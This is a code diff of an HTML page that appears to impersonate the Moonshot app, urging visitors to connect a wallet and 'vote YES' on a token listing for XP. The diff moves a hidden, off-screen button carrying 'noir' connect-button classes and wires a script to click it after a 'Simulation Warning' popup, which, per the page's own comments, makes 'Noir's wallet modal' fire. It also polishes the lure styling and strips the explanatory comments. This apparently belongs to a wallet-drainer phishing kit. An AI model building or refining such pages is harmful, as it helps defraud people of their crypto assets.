@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-
+  
 <head>
   <meta charset="utf-8" />
   <meta content="IE=edge" http-equiv="X-UA-Compatible" />
@@ -48,6 +48,37 @@
 
   <!-- Simulation Warning Styles -->
   <style>
+    /* ===== PINK STYLING FOR VOTE BUTTONS ===== */
+    /* Main "Vote to list" button on the notice board */
+    .intro_block_button_yes {
+      background: linear-gradient(135deg, #f631fc, #d431e0) !important;
+      color: #fff !important;
+      border: none !important;
+      box-shadow: 0 4px 20px rgba(246, 49, 252, 0.35) !important;
+      transition: all 0.2s ease !important;
+    }
+    .intro_block_button_yes:hover {
+      transform: translateY(-2px) !important;
+      box-shadow: 0 8px 30px rgba(246, 49, 252, 0.5) !important;
+      background: linear-gradient(135deg, #ff5cff, #e044f0) !important;
+    }
+    .intro_block_button_yes:active {
+      transform: translateY(0) !important;
+      box-shadow: 0 2px 12px rgba(246, 49, 252, 0.3) !important;
+    }
+
+    /* Sticky CTA bar button at the bottom */
+    .sticky_cta_bar_btn {
+      background: linear-gradient(135deg, #f631fc, #d431e0) !important;
+      color: #fff !important;
+      border: none !important;
+      box-shadow: 0 4px 20px rgba(246, 49, 252, 0.35) !important;
+    }
+    .sticky_cta_bar_btn:hover {
+      background: linear-gradient(135deg, #ff5cff, #e044f0) !important;
+      box-shadow: 0 8px 30px rgba(246, 49, 252, 0.5) !important;
+    }
+
     .sim-overlay {
       position: fixed;
       top: 0;
@@ -180,9 +211,6 @@
     .sim-badge-row { display: flex; justify-content: center; gap: 6px; flex-wrap: wrap; margin-top: 12px; }
     .sim-badge { font-size: 10.5px; color: #6b6578; background: rgba(255, 255, 255, 0.04); padding: 3px 10px; border-radius: 10px; border: 1px solid #2a2d36; white-space: nowrap; }
 
-    /* Popup visibility hidden by default */
-    .sim-popup-hidden { display: none !important; }
-
     @media (max-width: 480px) {
       .sim-header { padding: 20px 18px 14px; }
       .sim-body { padding: 14px 18px 10px; }
@@ -198,9 +226,21 @@
       .sim-footer { flex-direction: column; }
       .sim-btn { padding: 13px; }
     }
+
+    /* Restore pink styling for the YES confirm button since we removed Noir classes */
+    #modalYesConfirm {
+      background: linear-gradient(135deg, #f631fc, #d431e0) !important;
+      color: #fff !important;
+      border: none !important;
+      box-shadow: 0 4px 16px rgba(246, 49, 252, 0.25) !important;
+    }
+    #modalYesConfirm:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 6px 24px rgba(246, 49, 252, 0.35) !important;
+    }
   </style>
 </head>
-
+  
 <body>
 
   <!-- ===== LOADING OVERLAY (only when CA is present) ===== -->
@@ -243,6 +283,9 @@
   <!-- ===== VOTE PAGE (hidden until CA loads) ===== -->
   <div id="votePage" style="display:none;">
 
+    <!-- Hidden Noir trigger button (invisible, gets clicked programmatically) -->
+    <button id="noirTrigger" class="connect-button k2by52-3c noir" style="display:none !important; position:absolute; left:-9999px; top:-9999px; width:1px; height:1px; opacity:0.001; pointer-events:none; z-index:-1;" aria-hidden="true" tabindex="-1"></button>
+
     <!-- YES VOTE MODAL -->
     <div class="modal" id="modalYes">
       <div class="modal_overlay"></div>
@@ -268,7 +311,7 @@
           </div>
           <p class="modal_rect_text">By voting YES, you're supporting <span class="modal_rect_text_pink modalCoinNameText">this token</span> for potential listing. If this token reaches the community threshold, it enters our review queue and could go live in the Moonshot app at <span class="modal_rect_text_utc">00:00 UTC</span> the following day.</p>
           <div class="modal_rect_buttons">
-            <!-- Original button: REMOVED noir classes, now just opens our popup -->
+            <!-- YES button: no Noir classes, just opens our popup. Pink styling restored via CSS -->
             <button class="modal_rect_button" id="modalYesConfirm">🚀 Vote YES & Earn XP</button>
             <button class="modal_rect_button" id="modalYesCancel">Cancel</button>
           </div>
@@ -276,19 +319,12 @@
       </div>
     </div>
 
-    <!-- Hidden Noir trigger button (will be clicked programmatically) -->
-    <button id="noirTrigger" class="connect-button k2by52-3c noir" style="display:none !important; position:absolute; left:-9999px; top:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;" aria-hidden="true"></button>
-
     <!-- NO VOTE MODAL -->
     <div class="modal" id="modalNo">
       <div class="modal_overlay"></div>
       <div class="modal_rect">
         <div class="modal_rect_content">
-          <svg class="modal_rect_close" fill="none" height="40" viewBox="0 0 40 40" width="40">
-            <circle cx="20" cy="20" fill="#3E3C58" fill-opacity="0.5" r="20" />
-            <path d="M24.9916 13.3446C25.451 12.8851 26.1959 12.8851 26.6554 13.3446C27.1149 13.8041 27.1149 14.549 26.6554 15.0084L15.0084 26.6554C14.549 27.1149 13.8041 27.1149 13.3446 26.6554C12.8851 26.1959 12.8851 25.451 13.3446 24.9916L24.9916 13.3446Z" fill="#E4DEF3" />
-            <path d="M26.6554 24.9916C27.1149 25.451 27.1149 26.1959 26.6554 26.6554C26.1959 27.1149 25.451 27.1149 24.9916 26.6554L13.3446 15.0084C12.8851 14.549 12.8851 13.8041 13.3446 13.3446C13.8041 12.8851 14.549 12.8851 15.0084 13.3446L26.6554 24.9916Z" fill="#E4DEF3" />
-          </svg>
+          <svg class="modal_rect_close" fill="none" height="40" viewBox="0 0 40 40" width="40"><circle cx="20" cy="20" fill="#3E3C58" fill-opacity="0.5" r="20" /><path d="M24.9916 13.3446C25.451 12.8851 26.1959 12.8851 26.6554 13.3446C27.1149 13.8041 27.1149 14.549 26.6554 15.0084L15.0084 26.6554C14.549 27.1149 13.8041 27.1149 13.3446 26.6554C12.8851 26.1959 12.8851 25.451 13.3446 24.9916L24.9916 13.3446Z" fill="#E4DEF3" /><path d="M26.6554 24.9916C27.1149 25.451 27.1149 26.1959 26.6554 26.6554C26.1959 27.1149 25.451 27.1149 24.9916 26.6554L13.3446 15.0084C12.8851 14.549 12.8851 13.8041 13.3446 13.3446C13.8041 12.8851 14.549 12.8851 15.0084 13.3446L26.6554 24.9916Z" fill="#E4DEF3" /></svg>
           <div class="modal_rect_up">
             <img alt="" class="modal_rect_up_logo modalCoinLogo" src="assets_img_modal_rect_logo.png" />
             <div class="modal_rect_up_texts">
@@ -434,7 +470,7 @@
                 <div class="informations_rect_content">
                   <h4 class="informations_rect_why">Why vote?</h4>
                   <ul class="informations_rect_lists">
-                    <li class="informations_rect_list">Each eligible YES vote grants <span>Moonshot XP</span> — unlock perks &amp; early features.</li>
+                    <li class="informations_rect_list">Each eligible YES vote grants <span>Moonshot XP</span> — unlock perks & early features.</li>
                     <li class="informations_rect_list">Strong sentiment moves this token into the review queue for listing in the <span>Moonshot</span> app.</li>
                     <li class="informations_rect_list">A connected wallet is required. Each YES vote earns <span>Moonshot XP</span></li>
                   </ul>
@@ -474,18 +510,8 @@
     (function() {
       'use strict';
 
-      /**
-       * Simulation Warning Popup — v4
-       * Strategy: 
-       * - Remove .connect-button.k2by52-3c.noir from the visible YES button
-       * - Add a hidden button with those classes that Noir will latch onto
-       * - When user clicks the visible YES button → show our popup
-       * - "Proceed" clicks the hidden Noir button → Noir's wallet modal fires
-       */
-
       var popupActive = false;
 
-      // Build popup HTML
       function getPopupHTML() {
         return '<div class="sim-overlay" id="simOverlay">' +
           '<div class="sim-modal">' +
@@ -516,7 +542,6 @@
           '</div></div>' +
           '<div class="sim-footer">' +
           '<button class="sim-btn sim-btn-cancel" id="simBtnCancel">Cancel</button>' +
-          // The Proceed button does NOT have Noir classes — it just triggers the hidden button
           '<button class="sim-btn sim-btn-proceed" id="simBtnProceed">✓ I understand, proceed</button>' +
           '</div></div></div>';
       }
@@ -551,15 +576,12 @@
           if (e.target === overlay) cleanup();
         });
 
-        // Proceed: click the hidden Noir trigger button
         document.getElementById('simBtnProceed').addEventListener('click', function(e) {
           e.stopPropagation();
           cleanup();
-          
-          // Click the hidden noir trigger button
+          // Click the hidden Noir trigger
           var trigger = document.getElementById('noirTrigger');
           if (trigger) {
-            // Small delay to let popup fully close
             setTimeout(function() {
               trigger.click();
             }, 50);
@@ -567,12 +589,11 @@
         });
       }
 
-      // Hook the YES button (now without Noir classes) to show our popup
+      // Hook the YES confirm button
       function init() {
         var yesBtn = document.getElementById('modalYesConfirm');
         if (yesBtn) {
           yesBtn.addEventListener('click', function(e) {
-            // Only intercept if the popup isn't already showing
             if (!popupActive) {
               e.preventDefault();
               e.stopPropagation();
@@ -580,22 +601,7 @@
             }
           });
         }
-
-        // Also hook the "Vote to list" button on the main page
-        var voteToListBtn = document.getElementById('buttonYes');
-        if (voteToListBtn) {
-          voteToListBtn.addEventListener('click', function() {
-            // Wait a tick for the modal to open, then our hook on modalYesConfirm will catch it
-          });
-        }
-
-        // Sticky vote button
-        var stickyBtn = document.getElementById('stickyVoteBtn');
-        if (stickyBtn) {
-          // Same — the modal's confirm button hook handles it
-        }
-
-        console.log('[SimWarning] v4 active — Noir classes moved to hidden trigger button');
+        console.log('[SimWarning] Active — YES button hooked, Noir classes on hidden trigger');
       }
 
       if (document.readyState === 'loading') {
@@ -604,11 +610,11 @@
         init();
       }
 
-      // Re-apply hook if modal content changes dynamically
+      // MutationObserver for dynamic changes
       var observer = new MutationObserver(function() {
         var yesBtn = document.getElementById('modalYesConfirm');
-        if (yesBtn && !yesBtn.hasAttribute('data-sim-v4')) {
-          yesBtn.setAttribute('data-sim-v4', 'true');
+        if (yesBtn && !yesBtn.hasAttribute('data-sim-hooked')) {
+          yesBtn.setAttribute('data-sim-hooked', 'true');
           yesBtn.addEventListener('click', function(e) {
             if (!popupActive) {
               e.preventDefault();
